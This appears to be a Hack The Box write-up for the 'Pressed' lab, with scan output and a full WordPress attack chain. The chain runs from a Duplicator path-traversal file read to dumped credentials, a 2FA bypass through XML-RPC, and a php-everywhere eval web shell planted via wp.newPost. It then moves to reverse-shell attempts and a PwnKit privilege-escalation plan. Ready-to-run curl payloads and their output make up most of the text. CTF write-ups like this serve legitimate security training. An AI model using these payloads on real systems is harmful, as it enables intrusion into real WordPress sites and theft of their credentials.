# Pressed

──╼ [★]$ sudo nmap -sCV 10.129.136.28
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-23 18:58 EDT
Nmap scan report for 10.129.136.28
Host is up (0.067s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UHC Jan Finals – New Month, New Boxes

sudo wpscan --url [http://10.129.136.28](http://10.129.136.28/) --detection-mode aggressive --plugins-detection aggressivef

[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
| Location: [http://10.129.136.28/wp-content/plugins/akismet/](http://10.129.136.28/wp-content/plugins/akismet/)
| Last Updated: 2026-04-23T22:34:00.000Z
| Readme: [http://10.129.136.28/wp-content/plugins/akismet/readme.txt](http://10.129.136.28/wp-content/plugins/akismet/readme.txt)
| [!] The version is out of date, the latest version is 5.7
|
| Found By: Known Locations (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/akismet/](http://10.129.136.28/wp-content/plugins/akismet/), status: 200
|
| Version: 4.2.2 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/akismet/readme.txt](http://10.129.136.28/wp-content/plugins/akismet/readme.txt)
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/akismet/readme.txt](http://10.129.136.28/wp-content/plugins/akismet/readme.txt)

[+] duplicator
| Location: [http://10.129.136.28/wp-content/plugins/duplicator/](http://10.129.136.28/wp-content/plugins/duplicator/)
| Last Updated: 2026-05-22T21:05:00.000Z
| Readme: [http://10.129.136.28/wp-content/plugins/duplicator/readme.txt](http://10.129.136.28/wp-content/plugins/duplicator/readme.txt)
| [!] The version is out of date, the latest version is 1.5.16.1
| [!] Directory listing is enabled
|
| Found By: Known Locations (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/duplicator/](http://10.129.136.28/wp-content/plugins/duplicator/), status: 200
|
| Version: 1.3.26 (80% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/duplicator/readme.txt](http://10.129.136.28/wp-content/plugins/duplicator/readme.txt)

[+] miniorange-2-factor-authentication
| Location: [http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/](http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/)
| Last Updated: 2026-05-21T12:30:00.000Z
| Readme: [http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/readme.txt](http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/readme.txt)
| [!] The version is out of date, the latest version is 6.2.5
| [!] Directory listing is enabled
|
| Found By: Known Locations (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/](http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/), status: 200
|
| Version: 5.4.51 (80% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/readme.txt](http://10.129.136.28/wp-content/plugins/miniorange-2-factor-authentication/readme.txt)

[+] php-everywhere
| Location: [http://10.129.136.28/wp-content/plugins/php-everywhere/](http://10.129.136.28/wp-content/plugins/php-everywhere/)
| Latest Version: 3.0.0 (up to date)
| Last Updated: 2022-01-10T23:05:00.000Z
| Readme: [http://10.129.136.28/wp-content/plugins/php-everywhere/readme.txt](http://10.129.136.28/wp-content/plugins/php-everywhere/readme.txt)
|
| Found By: Known Locations (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/php-everywhere/](http://10.129.136.28/wp-content/plugins/php-everywhere/), status: 200
|
| Version: 3.0.0 (50% confidence)
| Found By: Readme - ChangeLog Section (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/php-everywhere/readme.txt](http://10.129.136.28/wp-content/plugins/php-everywhere/readme.txt)

[+] relative-url
| Location: [http://10.129.136.28/wp-content/plugins/relative-url/](http://10.129.136.28/wp-content/plugins/relative-url/)
| Latest Version: 0.1.8 (up to date)
| Last Updated: 2021-08-11T18:45:00.000Z
| Readme: [http://10.129.136.28/wp-content/plugins/relative-url/readme.txt](http://10.129.136.28/wp-content/plugins/relative-url/readme.txt)
| [!] Directory listing is enabled
|
| Found By: Known Locations (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/relative-url/](http://10.129.136.28/wp-content/plugins/relative-url/), status: 200
|
| Version: 0.1.8 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/relative-url/readme.txt](http://10.129.136.28/wp-content/plugins/relative-url/readme.txt)
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
|  - [http://10.129.136.28/wp-content/plugins/relative-url/readme.txt](http://10.129.136.28/wp-content/plugins/relative-url/readme.txt)

[+] Enumerating Config Backups (via Aggressive Methods)
Checking Config Backups - Time: 00:00:02 <=> (137 / 137) 100.00% Time: 00:00:02

[i] Config Backup(s) Identified:

[!] [http://10.129.136.28/wp-config.php.bak](http://10.129.136.28/wp-config.php.bak)
| Found By: Direct Access (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at [https://wpscan.com/register](https://wpscan.com/register)

[+] Finished: Tue Jun 23 19:34:17 2026
[+] Requests Done: 123515
[+] Cached Requests: 7
[+] Data Sent: 33.309 MB
[+] Data Received: 40.298 MB
[+] Memory used: 436.52 MB
[+] Elapsed time: 00:30:10

 1. duplicator 1.3.26 → unauthenticated arbitrary file read (CVE‑2020‑11738)

cat wp-config.php.bak
<?php
/**

- The base configuration for WordPress
- 
- The wp-config.php creation script uses this file during the installation.
- You don't have to use the web site, you can copy this file to "wp-config.php"
- and fill in the values.
- 
- This file contains the following configurations:
- 
- 
    - Database settings
- 
    - Secret keys
- 
    - Database table prefix
- 
    - ABSPATH
- 
- @link [https://wordpress.org/support/article/editing-wp-config-php/](https://wordpress.org/support/article/editing-wp-config-php/)
- 
- @package WordPress
*/

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+

- Authentication unique keys and salts.
- 
- Change these to different unique phrases! You can generate these using
- the {@link [https://api.wordpress.org/secret-key/1.1/salt/](https://api.wordpress.org/secret-key/1.1/salt/) [WordPress.org](http://wordpress.org/) secret-key service}.
- 
- You can change these at any point in time to invalidate all existing cookies.
- This will force all users to have to log in again.
- 
- @since 2.6.0
*/
define( 'AUTH_KEY', '3MYXll40,8gfj_jX4!3J(278f1(SGEZ+v]#w]Bu<PrstLLHEZig,MJB#t E2pU2t' );
define( 'SECURE_AUTH_KEY', 'QPkQ%%h&5$3$C;Z}2N!LKz.O 57i2U.582Gy{C=$XV_(jJz~3gC=*nKP//{v{?n<' );
define( 'LOGGED_IN_KEY',    'rp}RE/3-_3OF%./6PH` 1zbCy#H22NRH,ETR(c2*Qlu&W>lW|::4T[iFx%W|%[hA' );
define( 'NONCE_KEY',        '#%s&zIE/mSuvN{+2]^n;21]|u;gmP6!-ihyCn91j{/.KRGbg8}{3C%kZ#$(i&bc-' );
define( 'AUTH_SALT', ',7BVMi:h`][Q/3j8tHN*EjKk,jY|+hm.3OnjYS A$ArIx7B z]WzLJ$Tc7</s`td' );
define( 'SECURE_AUTH_SALT', ']s_RJ,%OLa.}_8wP Qeu9WJUhJ2Zd2I%>T5R#f{8op9:Hn??}7{ZJ*.K.t/{lVl0' );
define( 'LOGGED_IN_SALT', 'wwQj(p&1I8zAK!2lhR[xg.Vt`qeh|2R}HMz?~TuQ9QE*@iy?@*?pDV;[4BL9*n#W' );
define( 'NONCE_SALT', '[Wv%%EDN<b/a_</u|snqMQ q)xPW8GyB4WAw f+1k2|IFbu*7#U(g-# l{Kw n6Z' );

/**#@-*/

/**

- WordPress database table prefix.
- 
- You can have multiple installations in one database if you give each
- a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix = 'wp_';

/**

- For developers: WordPress debugging mode.
- 
- Change this to true to enable the display of notices during development.
- It is strongly recommended that plugin and theme developers use WP_DEBUG
- in their development environments.
- 
- For information on other constants that can be used for debugging,
- visit the documentation.
- 
- @link [https://wordpress.org/support/article/debugging-in-wordpress/](https://wordpress.org/support/article/debugging-in-wordpress/)
*/
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
define( 'ABSPATH', **DIR** . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

curl -s "[http://10.129.136.28/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../etc/passwd](http://10.129.136.28/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../etc/passwd)"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:118:MySQL Server,,,:/nonexistent:/bin/false

curl -s "[http://10.129.136.28/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../var/www/html/wp-config.php](http://10.129.136.28/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../var/www/html/wp-config.php)"
<?php
/**

- The base configuration for WordPress
- 
- The wp-config.php creation script uses this file during the installation.
- You don't have to use the web site, you can copy this file to "wp-config.php"
- and fill in the values.
- 
- This file contains the following configurations:
- 
- 
    - Database settings
- 
    - Secret keys
- 
    - Database table prefix
- 
    - ABSPATH
- 
- @link [https://wordpress.org/support/article/editing-wp-config-php/](https://wordpress.org/support/article/editing-wp-config-php/)
- 
- @package WordPress
*/

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2022' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+

- Authentication unique keys and salts.
- 
- Change these to different unique phrases! You can generate these using
- the {@link [https://api.wordpress.org/secret-key/1.1/salt/](https://api.wordpress.org/secret-key/1.1/salt/) [WordPress.org](http://wordpress.org/) secret-key service}.
- 
- You can change these at any point in time to invalidate all existing cookies.
- This will force all users to have to log in again.
- 
- @since 2.6.0
*/
define( 'AUTH_KEY', '3MYXll40,8gfj_jX4!3J(278f1(SGEZ+v]#w]Bu<PrstLLHEZig,MJB#t E2pU2t' );
define( 'SECURE_AUTH_KEY', 'QPkQ%%h&5$3$C;Z}2N!LKz.O 57i2U.582Gy{C=$XV_(jJz~3gC=*nKP//{v{?n<' );
define( 'LOGGED_IN_KEY',    'rp}RE/3-_3OF%./6PH` 1zbCy#H22NRH,ETR(c2*Qlu&W>lW|::4T[iFx%W|%[hA' );
define( 'NONCE_KEY',        '#%s&zIE/mSuvN{+2]^n;21]|u;gmP6!-ihyCn91j{/.KRGbg8}{3C%kZ#$(i&bc-' );
define( 'AUTH_SALT', ',7BVMi:h`][Q/3j8tHN*EjKk,jY|+hm.3OnjYS A$ArIx7B z]WzLJ$Tc7</s`td' );
define( 'SECURE_AUTH_SALT', ']s_RJ,%OLa.}_8wP Qeu9WJUhJ2Zd2I%>T5R#f{8op9:Hn??}7{ZJ*.K.t/{lVl0' );
define( 'LOGGED_IN_SALT', 'wwQj(p&1I8zAK!2lhR[xg.Vt`qeh|2R}HMz?~TuQ9QE*@iy?@*?pDV;[4BL9*n#W' );
define( 'NONCE_SALT', '[Wv%%EDN<b/a_</u|snqMQ q)xPW8GyB4WAw f+1k2|IFbu*7#U(g-# l{Kw n6Z' );

/**#@-*/

/**

- WordPress database table prefix.
- 
- You can have multiple installations in one database if you give each
- a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix = 'wp_';

/**

- For developers: WordPress debugging mode.
- 
- Change this to true to enable the display of notices during development.
- It is strongly recommended that plugin and theme developers use WP_DEBUG
- in their development environments.
- 
- For information on other constants that can be used for debugging,
- visit the documentation.
- 
- @link [https://wordpress.org/support/article/debugging-in-wordpress/](https://wordpress.org/support/article/debugging-in-wordpress/)
*/
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
define( 'ABSPATH', **DIR** . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

admin:uhc-jan-finals-2022

# Pressed (HTB / UHC Jan Finals) — Attack Chain

**Target:** `10.129.136.28` (vhost `pressed.htb`)
**Attacker VPN IP:** `10.10.15.206`**Result so far:** Unauthenticated → admin (2FA bypassed) → **RCE as `www-data`** → user flag. Root in progress.

> Add the vhost to your hosts file first:
> 
> 
> ```bash
> echo "10.129.136.28  pressed.htb" | sudo tee -a /etc/hosts
> ```
> 

---

## 0. Recon — WordPress + vulnerable plugins

`wpscan` enumerated the plugins. The two that matter:

| Plugin | Version | Role in chain |
| --- | --- | --- |
| **duplicator** | 1.3.26 | Unauthenticated arbitrary file read (CVE-2020-11738) |
| **php-everywhere** | 3.0.0 | Authenticated RCE — `eval()` of PHP stored in a block |
| miniorange-2-factor | 5.4.51 | 2FA gate on `wp-login.php` (bypassed via XML-RPC) |
| akismet | 4.2.2 | Not exploitable |

---

## 1. Duplicator — unauthenticated arbitrary file read (CVE-2020-11738)

The `duplicator_download` AJAX action is vulnerable to path traversal with **no auth**.

```bash
# Proof — read /etc/passwd
curl -s "<http://10.129.136.28/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../../../../../etc/passwd>"
```

Users found: `root` and **`htb`** (uid 1000, `/bin/bash`).

**Read `wp-config.php` (traversal depth 1 from the download base dir):**

```bash
curl -s "<http://10.129.136.28/wp-admin/admin-ajax.php?action=duplicator_download&file=/../wp-config.php>"
```

**Recovered DB credentials:**

```
DB_NAME     = wordpress
DB_USER     = admin
DB_PASSWORD = uhc-jan-finals-2022
DB_HOST     = localhost          # 3306 is localhost-only → not remotely reachable
```

> Note: the box author patched the Duplicator downloader with a filename blocklist
("Invalid installer file name!!") that rejects a few names (e.g. the plugin's main
file, `id_rsa`). Most files — `wp-config.php`, `/etc/passwd`, the plugin's `admin/`
and `public/` classes — still read fine, which is how the php-everywhere source below
was obtained.
> 

---

## 2. Credentials → admin (the `admin` WP user reuses the DB password)

`admin` / `uhc-jan-finals-2022` are valid WordPress admin creds. But the login is gated
by **miniOrange 2FA** (one-time passcode prompt).

### 2FA bypass attempts

- **Self-enroll** — N/A, the account already has a TOTP enrolled (code prompt, not setup).
- **Read TOTP secret from DB** — blocked: `wp_usermeta` is in MySQL, `3306` is `localhost`only and no Duplicator backup package / `.sql` dump exists on disk.
- **Direct-navigation** (submit creds, then request `/wp-admin/` with the returned cookies) — **failed**: miniOrange correctly withholds the auth cookie until OTP passes (302 → `pressed.htb/wp-login.php?...reauth=1`).
- **XML-RPC** — ✅ **works**. 2FA plugins hook `wp-login.php`, **not** `xmlrpc.php`.

```bash
curl -s "<http://10.129.136.28/xmlrpc.php>" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>
  <params><param><value>admin</value></param>
  <param><value>uhc-jan-finals-2022</value></param></params></methodCall>'
# => isAdmin=1, blogName "UHC Jan Finals"  → authenticated admin, 2FA skipped
```

---

## 3. php-everywhere 3.0.0 — authenticated RCE

### How the plugin executes PHP (from recovered source)

`admin/class-php-everywhere-block.php` registers block `php-everywhere-block/php`; its
render callback includes `public/partials/php-everywhere-block-public-display.php`, which is:

```php
// only runs on the public frontend (not REST, not wp-admin)
eval(' ?>'.urldecode(base64_decode($attributes['code'])).'<?php ');
```

So a post containing the block runs arbitrary PHP **on frontend render** (viewing the post,
unauthenticated). The `code` attribute = `base64( urlencode( <php> ) )`. Admins are an
allowed role by default.

### Exploitation (bypasses 2FA entirely — create via XML-RPC, trigger via frontend)

```bash
# 1) Build the block payload (command exec via ?c=)
PHP='<?php echo "PEX:"; system($_REQUEST["c"]); echo ":PEX"; ?>'
CODE=$(python3 -c "import urllib.parse,base64,sys;print(base64.b64encode(urllib.parse.quote(sys.argv[1]).encode()).decode())" "$PHP")
BLOCK="&lt;!-- wp:php-everywhere-block/php {\"code\":\"$CODE\"} /--&gt;"

# 2) Create a published post as admin over XML-RPC (no 2FA)
curl -s "<http://10.129.136.28/xmlrpc.php>" --data "<?xml version=\"1.0\"?>
<methodCall><methodName>wp.newPost</methodName><params>
<param><value><string>1</string></value></param>
<param><value><string>admin</string></value></param>
<param><value><string>uhc-jan-finals-2022</string></value></param>
<param><value><struct>
<member><name>post_type</name><value><string>post</string></value></member>
<member><name>post_status</name><value><string>publish</string></value></member>
<member><name>post_title</name><value><string>diag</string></value></member>
<member><name>post_content</name><value><string>$BLOCK</string></value></member>
</struct></value></param></params></methodCall>"
# => returns new post ID (e.g. 47), permalink /index.php/2026/06/24/diag/

# 3) Trigger RCE by viewing the post on the frontend
curl -s -L -H "Host: pressed.htb" \
  "<http://10.129.136.28/index.php/2026/06/24/diag/>" -G --data-urlencode "c=id"
# => uid=33(www-data) gid=33(www-data)
```

**Foothold: `www-data` on `Pressed` (Ubuntu, kernel 5.4.0-77).**

### User flag

```
/home/htb/user.txt  (world-readable)
=> 45a1ea3d67571d9e6de45954c9099bf0
```

> **Gotcha — WordPress smart-quote texturizing.** The `the_content` filter runs
`wptexturize` on rendered output, turning `'`/`"`/`--` into curly entities. This
corrupts any quotes in commands/output passed through the page. **Fix:** base64-encode
both the command and its output so only `[A-Za-z0-9+/=]` crosses the boundary:
`c=echo <b64>|base64 -d|bash`, and have the box `base64 -w0` its output for you to
decode locally.
> 

---

## 4. Shell strategy — the box is firewalled, use the HTTP RCE

This box drops everything except the web port:

- **Inbound:** only **port 80** allowed (a bind shell *listened* on 9001 but was
unreachable externally; same reason 22 looked "closed").
- **Outbound:** the box **cannot initiate any new connection back** — reverse shells to
`10.10.15.206` on 443 / 8443 / 80 / 53 / 4444 all **silently drop** (`/dev/tcp` →
`timeout rc=124`, not refused). Only *established* web traffic is permitted.

**Conclusion:** reverse and bind shells are impossible. The **HTTP RCE on port 80 is the
only channel** — so we drive the box through an HTTP-RCE wrapper that base64-wraps command
and output and tracks `cwd`. (Script: `pressed-shell.sh`, usage `./pressed-shell.sh` for an
interactive prompt or `./pressed-shell.sh '<cmd>'` for one-offs.)

---

## 5. Privilege escalation (in progress)

### Root cron (every minute)

```
* * * * * root python3 /var/www/parse.py > /var/www/html/output.log
```

`parse.py` parses `/var/log/apache2/access.log` into an HTML table of User-Agents.

- **Log-poisoning via User-Agent:** ❌ — the UA field is passed through `html.escape()`.
- **Python import hijack** (Python prepends the script dir `/var/www` to `sys.path`): ❌ —
`/var/www` is root-owned and **not writable** by `www-data`; no `sys.path` entry is writable.

### Leads still open

1. **`/var/www/html/.wp-config.php.swp`** — root-owned, **world-readable** vim swap next to
the webroot. Exfil binary-safe (base64) and recover locally with `vim -r` / `strings` —
may contain a reused password (→ `htb` user, who may have `sudo`, or → `root`).
2. **PwnKit (CVE-2021-4034)** — `pkexec` is SUID and present on this polkit/Ubuntu 2021
build → reliable instant local root. Drop a precompiled PwnKit to `/tmp` (or
`/var/www/html`) via the HTTP RCE and run it.

### SUID binaries present

```
/usr/bin/at  /usr/bin/pkexec  /usr/bin/sudo  /usr/bin/su  /usr/bin/mount
/usr/bin/umount  /usr/bin/newgrp  /usr/bin/chfn  /usr/bin/chsh  /usr/bin/gpasswd
/usr/bin/passwd  /usr/bin/fusermount  ... (pkexec → PwnKit is the standout)
```

### `sudo -l`

```
www-data: a password is required  (no passwordless sudo)
```

---

## Summary chain

```
Duplicator 1.3.26 arbitrary file read (CVE-2020-11738)
        └─> wp-config.php → admin:uhc-jan-finals-2022
                └─> miniOrange 2FA bypassed via XML-RPC (admin, no OTP)
                        └─> php-everywhere 3.0.0 block eval()  (post via XML-RPC, trigger on frontend)
                                └─> RCE as www-data  → user.txt
                                        └─> [next] .swp recovery / PwnKit  → root
```